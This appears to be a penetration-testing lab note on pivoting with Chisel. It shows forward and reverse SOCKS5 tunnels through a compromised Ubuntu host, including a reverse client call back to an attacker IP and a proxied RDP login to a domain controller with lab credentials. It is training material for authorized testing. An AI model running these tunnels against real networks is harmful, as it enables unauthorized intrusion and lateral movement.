### Overview

Chisel is a TCP/UDP tunneling tool written in Go. It uses HTTP secured with SSH to tunnel traffic. This is useful in firewall-restricted environments where traditional port forwarding or VPNs may not be feasible. Chisel supports both **forward** and **reverse** SOCKS5 tunneling.

---

### Scenario

- **Internal Target (Domain Controller)**: `172.16.5.19`
- **Pivot Host (Compromised Ubuntu Server)**: `10.129.202.64` (External), `172.16.5.0/23` (Internal)
- **Attack Host (Kali or External Attacker System)**: `10.10.14.17`

The objective is to tunnel Remote Desktop Protocol (RDP) traffic from the attack host to the Domain Controller by leveraging the Ubuntu pivot host.

---

## ==Setup Phase (Attack Host)==

### Clone Chisel Repository

```Shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

gunzip chisel_1.7.6_linux_amd64.gz 
```

### Build the Chisel Binary ==(Optional)==

```Shell
cd chisel
go build
```

### Transfer Chisel to Pivot Host

```Shell
z3tssu@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```

---

## Chisel Forward SOCKS5 Tunneling

This method involves starting the Chisel server on the **pivot host** and connecting to it from the **attack host**.

### Start Chisel Server (Pivot Host)

```Shell
chmod +x chisel_1.7.6_linux_amd64

./chisel_1.7.6_linux_amd64 server -v -p 1234 --socks5
```

- Listens on `0.0.0.0:1234`
- Enables a SOCKS5 proxy on incoming connections

### Start Chisel Client (Attack Host)

```Shell
chmod +x ./chisel_1.7.6_linux_amd64

./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:1234 socks
```

- Establishes an SSH-encrypted tunnel
- Local SOCKS5 proxy bound to `127.0.0.1:1080`

### Configure Proxychains (Attack Host)

Edit `/etc/proxychains.conf` to include:

```Plain
tail -n2 /etc/proxychains.conf

\#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

### Access the Domain Controller via Proxychains (Attack Host)

```Shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Reverse SOCKS5 Tunneling

This method is useful when **inbound connections to the pivot host are blocked**. Instead, the **pivot host connects back to the attack host**.

### Start Chisel Server in Reverse Mode (Attack Host)

```Shell
z3tssu@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

- Listens on `0.0.0.0:1234`
- Accepts reverse connections and enables a SOCKS5 proxy

### Start Chisel Client (Pivot Host)

```Shell
ubuntu@WEB01:~$ ./chisel client -v 10.10.14.17:1234 R:socks
```

- Initiates a reverse tunnel
- Redirects SOCKS5 traffic to internal network via the pivot

### Configure Proxychains (Attack Host)

```Plain
[ProxyList]
socks5 127.0.0.1 1080
```

### Access the Domain Controller via Proxychains (Attack Host)

```Shell
z3tssu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---